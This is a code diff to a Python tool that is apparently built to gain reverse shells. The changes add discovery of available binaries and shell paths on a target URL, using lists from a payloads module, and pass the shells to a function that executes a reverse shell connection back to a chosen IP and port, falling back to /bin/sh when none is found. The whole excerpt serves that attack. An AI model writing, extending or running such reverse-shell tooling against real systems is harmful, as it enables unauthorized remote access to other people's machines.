@@ -3,6 +3,7 @@ import subprocess
 
 import psutil
 
+from data import payloads
 from modules import commands, connection, flags, local, logger
 
 parser = argparse.ArgumentParser(
@@ -40,9 +41,14 @@ else:
     port = results.port
 logger.log(f"Final connection string will be {ip}:{port}...")
 logger.log("Finding bins...")
-bins = commands.find_bins(results.url, results.verbose)
+bins = commands.find_bins(results.url, results.verbose, list(payloads.bins.keys()))
+logger.log("Finding shells...")
+shells = commands.find_bins(results.url, results.verbose, payloads.shells)
 if len(bins) < 1:
     logger.log("No valid bins found.")
     quit()
+if len(shells) < 1:
+    logger.log("No valid shells found. Defaulting to /bin/sh")
+    shells = ["/bin/sh"]
 logger.log("Executing reverse shell...")
-commands.reverse_connection(bins, results.url, ip, port, results.verbose)
+commands.reverse_connection(bins, shells, results.url, ip, port, results.verbose)
